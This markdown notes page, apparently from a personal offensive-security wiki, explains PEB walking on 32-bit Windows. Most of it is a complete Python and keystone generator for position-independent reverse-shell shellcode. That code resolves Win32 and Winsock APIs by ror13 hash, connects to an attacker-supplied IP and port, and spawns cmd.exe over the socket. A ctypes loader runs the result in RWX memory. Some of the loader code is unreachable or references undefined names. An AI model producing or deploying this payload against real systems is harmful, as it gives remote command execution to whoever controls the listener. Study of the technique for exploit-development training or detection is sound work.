---
title: PEB walking
tags:
  - process
  - execution
  - block
  - shellcode
  - windows
  - x86
  - python
  - keystone
  - pwn
  - walking
  - reverse
  - shell
  - peb
  - win32api
  - api
---

The **Process Environment Block (PEB)** maintains a listing of libraries that
have been loaded into the current process. When writing position independent
shellcode for Windows targets, we need the ability to access and call Win32 API
methods to execute more sophisticated actions, like spawning a new process. With
assembly, we can write shellcode procedures to search for `kernel32.dll` in
memory and then use a custom hashing function to find pointers to useful
functions within the library. More importantly, we can search for the
`LoadLibraryA` function in `kernel32.dll` to load more libraries into the
process, giving us access to more methods we can use in our shellcode.

Using the following **Python** code, we can generate unique hashes for method
names we're searching for with our PEB walking shellcode:

```python
from sys import argv, exit

import numpy


def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)


def main() -> int:
    try:
        esi = argv[1]
    except IndexError:
        print("Usage: %s INPUTSTRING" % argv[0])
        return 1

    # Initialize variables
    edx = 0x00
    ror_count = 0

    for eax in esi:
        edx = edx + ord(eax)
        if ror_count < len(esi) - 1:
            edx = ror_str(edx, 0xD)
        ror_count += 1

    print(hex(edx))
    return 0


if __name__ == "__main__":
    exit(main())
```

The following Python code uses **keystone** and **pwntools** to generate a
shellcode that will be executed in the current process' memory, executing a
reverse shell callback to an arbitrary IP address and port. The assembly code
defining this shellcode uses the PEB to find `kernel32.dll`, resolves useful
symbols in `kernel32.dll` like `LoadLibraryA`, and then uses these resolved
function pointers to load more libraries like `ws2_32.dll` to gain access to
functions like `WSAConnect`, etc. The resolution of function pointers within
each library is enabled by our hashing code provided above:

```python
import ctypes
from argparse import ArgumentParser, Namespace
from ipaddress import ip_address
from sys import exit

from keystone import *

from pwn import *


class Constants:
    PAGE_EXECUTE_READWRITE = 0x40
    PAGE_SIZE = 0x3000


def main(laddr: str, lport: int) -> int:
    laddr_hex = hex(u32(ip_address(laddr).packed))
    lport_hex = hex(u16(p16(lport, endianness="big")))

    shellcode = (
        "start:"
        # "    int3;"  # breakpoint for debugging
        "    mov ebp, esp;"
        "    add esp, 0xfffff9f0;"
        "find_kernel32:"
        "    xor ecx, ecx;"
        "    mov esi, fs:[ecx+0x30];"  # esi = &ProcessEnvironmentBlock
        "    mov esi, [esi+0xc];"  # esi = ProcessEnvironmentBlock->Ldr
        "    mov esi, [esi+0x1C];"  # esi = (ListEntry) ProcessEnvironmentBlock->Ldr.InInitializationOrderModuleList[0]
        "next_module:"
        "    mov ebx, [esi+0x8];"  # ebx = ListEntry.DllBase
        "    dec esi;"
        "    dec esi;"
        "    dec esi;"
        "    dec esi;"
        "    mov edi, [esi+0x24];"  # edi = ListEntry.BaseDllName
        "    inc esi;"
        "    inc esi;"
        "    inc esi;"
        "    inc esi;"
        "    mov esi, [esi];"  # esi = ListEntry.Next
        "    cmp [edi+12*2], cx;"  # (unicode) edi[12] == 0x0?
        "    jne next_module;"  # false, try next module
        "find_function_shorten:"
        "    jmp find_function_shorten_bnc;"
        "find_function_ret:"
        "    pop esi;"  # esi = return address
        "    mov [ebp+0x04], esi;"  # save find_function address for later usage
        "    jmp resolve_symbols_kernel32;"
        "find_function_shorten_bnc:"
        "    call find_function_ret;"
        "find_function:"
        "    pushad;"  # save all registers
        "    mov eax, [ebx+0x3c];"  # eax = offset to PE signature
        "    mov edi, [ebx+eax+0x78];"  # edi = export table directory relative virtual address (RVA)
        "    add edi, ebx;"  # edi = export table directory virtual memory address (VMA)
        "    mov ecx, [edi+0x18];"  # ecx = NumberOfNames
        "    mov eax, [edi+0x20];"  # eax = AddressOfNames RVA
        "    add eax, ebx;"  # eax = AddressOfNames VMA
        "    mov [ebp-4], eax;"  # save AddressOfNames VMA
        "find_function_loop:"
        "    jecxz find_function_finished;"  # jump to the end if ecx == 0
        "    dec ecx;"  # NumberOfNames--
        "    mov eax, [ebp-4];"  # eax = AddressOfNames VMA
        "    mov esi, [eax+ecx*4];"  # esi = RVA of the current symbol name
        "    add esi, ebx;"  # esi = VMA of the current symbol name
        "compute_hash:"
        "    xor eax, eax;"  # eax = 0
        "    cdq;"  # edx = 0
        "    cld;"  # clear direction
        "compute_hash_again:"
        "    lodsb;"  # al = &esi, esi++
        "    test al, al;"  # al == 0x0?
        "    jz compute_hash_finished;"  # 0x0 terminator reached
        "    ror edx, 0x0d;"  # edx>>13
        "    add edx, eax;"  # edx += eax
        "    jmp compute_hash_again;"
        "compute_hash_finished:"
        "find_function_compare:"
        "    cmp edx, [esp+0x24];"  # edx == arg0?
        "    jnz find_function_loop;"  # false, check next function
        "    mov edx, [edi+0x24];"  # edx = AddressOfNameOrdinals RVA
        "    add edx, ebx;"  # edx = AddressOfNameOrdinals VMA
        "    mov cx, [edx+2*ecx];"  # compute function's ordinal
        "    mov edx, [edi+0x1c];"  # edx = AddressOfFunctions RVA
        "    add edx, ebx;"  # edx = AddressOfFunctions VMA
        "    mov eax, [edx+4*ecx];"  # eax = current function's RVA
        "    add eax, ebx;"  # eax = current function's VMA
        "    mov [esp+0x1c], eax;"  # store eax in stack's pushad offset
        "find_function_finished:"
        "    popad;"  # restore all registers
        "    ret;"
        "resolve_symbols_kernel32:"
        "    push 0x78b5b983;"  # TerminateProcess hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x10], eax;"  # save TerminateProcess address
        "    push 0xec0e4e8e;"  # LoadLibraryA hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x14], eax;"  # save LoadLibraryA address
        "    push 0x16b3fe72;"  # CreateProcessA hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x18], eax;"  # save CreateProccessA address
        "load_ws2_32:"
        "    xor eax, eax;"  # eax = 0
        "    mov ax, 0x6c6c;"  # eax = "ll"
        "    push eax;"  # push "ll\x00"
        "    push 0x642e3233;"  # push "32.d"
        "    push 0x5f327377;"  # push "ws2_"
        "    push esp;"  # push arg0 (pointer to 'ws2_32.dll')
        "    call dword ptr [ebp+0x14];"  # call LoadLibraryA
        "resolve_symbols_ws2_32:"
        "    mov ebx, eax;"  # ebx = ws2_32.dll base VMA
        "    push 0x3bfcedcb;"  # WSAStartup hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x1c], eax;"  # save WSAStartup address
        "    push 0xadf509d9;"  # WSASocketA hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x20], eax;"  # save WSASocketA address
        "    push 0xb32dba0c;"  # WSAConnect hash
        "    call dword ptr [ebp+0x04];"  # call find_function
        "    mov [ebp+0x24], eax;"  # save WSAConnect address
        "exec_shellcode:"
        "call_wsastartup:"
        "    mov eax, esp;"  # eax = esp
        "    mov cx, 0x590;"  # ecx = 0x590
        "    sub eax, ecx;"  # eax -= ecx
        "    push eax;"  # push lpWSAData
        "    xor eax, eax;"  # eax = 0
        "    mov ax, 0x0202;"  # eax = version (2.2)
        "    push eax;"  # push wVersionRequired
        "    call dword ptr [ebp+0x1c];"  # call WSAStartup
        "call_wsasocketa:"
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push dwFlags
        "    push eax;"  # push g
        "    push eax;"  # push lpProtocolInfo
        "    mov al, 0x06;"  # eax = IPPROTO_TCP
        "    push eax;"  # push protocol
        "    sub al, 0x05;"  # eax = SOCK_STREAM
        "    push eax;"  # push type
        "    inc eax;"  # eax = AF_INET
        "    push eax;"  # push af
        "    call dword ptr [ebp+0x20];"  # call WSASocketA
        "call_wsaconnect:"
        "    mov esi, eax;"  # esi = sockfd
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push sin_zero[]
        "    push eax;"  # push sin_zero[]
        f"   push {laddr_hex};"  # push sin_addr
        f"   mov ax, {lport_hex};"  # eax = sin_port
        "    shl eax, 0x10;"  # eax<<0x10
        "    add ax, 0x02;"  # eax = AF_INET
        "    push eax;"  # push sin_port and sin_family
        "    push esp;"  # push &sockaddr_in
        "    pop edi;"  # edi = &sockaddr_in
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push lpGQOS
        "    push eax;"  # push lpSQOS
        "    push eax;"  # push lpCalleeData
        "    push eax;"  # push lpCallerData
        "    add al, 0x10;"  # eax = 0x10
        "    push eax;"  # push namelen
        "    push edi;"  # push *name
        "    push esi;"  # push s
        "    call dword ptr [ebp+0x24];"  # call WSAConnect
        " create_startupinfoa:"
        "    push esi;"  # push hStdError
        "    push esi;"  # push hStdOutput
        "    push esi;"  # push hStdInput
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push lpReserved2
        "    push eax;"  # push cbReserved2 & wShowWindow
        "    mov ax, 0xfff;"  # eax = 0xfff
        "    xor ax, 0xeff;"  # eax ^= 0xeff (0x100)
        "    push eax;"  # push dwFlags
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push dwFillAttribute
        "    push eax;"  # push dwYCountChars
        "    push eax;"  # push dwXCountChars
        "    push eax;"  # push dwYSize
        "    push eax;"  # push dwXSize
        "    push eax;"  # push dwY
        "    push eax;"  # push dwX
        "    push eax;"  # push lpTitle
        "    push eax;"  # push lpDesktop
        "    push eax;"  # push lpReserved
        "    mov al, 0x44;"  # eax = 0x44
        "    push eax;"  # push cb
        "    push esp;"  # push  &STARTUPINFOA
        "    pop edi;"  # edi = &STARTUPINFOA
        "create_cmd_string:"
        "    mov eax, 0xff9a879b;"  # eax = 0xff9a879b
        "    neg eax;"  # eax = 0x00657865 ('exe\x00')
        "    push eax;"  # push 'exe\x00'
        "    push  0x2e646d63;"  # push 'cmd.'
        "    push esp;"  # push &'cmd.exe\x00'
        "    pop ebx;"  # ebx = &'cmd.exe\x00'
        "call_createprocessa:"
        "    mov eax, esp;"  # eax = esp
        "    xor ecx, ecx;"  # ecx = 0
        "    mov cx, 0x390;"  # ecx = 0x390
        "    sub eax, ecx;"  # eax -= ecx
        "    push eax;"  # push lpProcessInformation
        "    push edi;"  # push lpStartupInfo
        "    xor eax, eax;"  # eax = 0
        "    push eax;"  # push lpCurrentDirectory
        "    push eax;"  # push lpEnvironment
        "    push eax;"  # push dwCreationFlags
        "    inc eax;"  # eax = 0x01 (True)
        "    push eax;"  # push bInheritHandles
        "    dec eax;"  # eax = 0
        "    push eax;"  # push lpThreadAttributes
        "    push eax;"  # push lpProcessAttributes
        "    push ebx;"  # push lpCommandLine
        "    push eax;"  # push lpApplicationName
        "    call dword ptr [ebp+0x18];"  # call CreateProcessA
        "call_terminateprocess:"
        "    xor ecx, ecx;"  # ecx = 0
        "    push ecx;"  # uExitCode (0)
        "    push 0xffffffff;"  # hProcess (-1)
        "    call dword ptr [ebp+0x10];"  # call TerminateProcess
    )
    encoding, _ = Ks(KS_ARCH_X86, KS_MODE_32).asm(shellcode)
    shellcode = bytearray(b"".join([p8(byte) for byte in encoding]))
    with open("shellcode", "wb") as shellcode_file:
        shellcode_file.write(bytes(shellcode))
    exit(0)

    segment = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(shellcode_len),
        ctypes.c_int(Constants.PAGE_SIZE),
        ctypes.c_int(Constants.PAGE_EXECUTE_READWRITE),
    )

    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(segment),
        (ctypes.c_uint8 * shellcode_len).from_buffer(shellcode),
        ctypes.c_int(shellcode_len),
    )

    input("[*] Press ENTER to execute shellcode...")

    t = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(segment),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )

    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(t),
        ctypes.c_int(-1),
    )

    return 0


def get_parsed_args() -> Namespace:
    parser = ArgumentParser(f"{Path(__name__).stem}")
    parser.add_argument(
        "-la", "--laddr", type=str, dest="laddr", required=True, help="local IP address"
    )
    parser.add_argument(
        "-lp", "--lport", type=int, dest="lport", default=1337, help="local port"
    )

    return parser.parse_args()


if __name__ == "__main__":
    args = get_parsed_args()
    exit(main(args.laddr, args.lport))
```
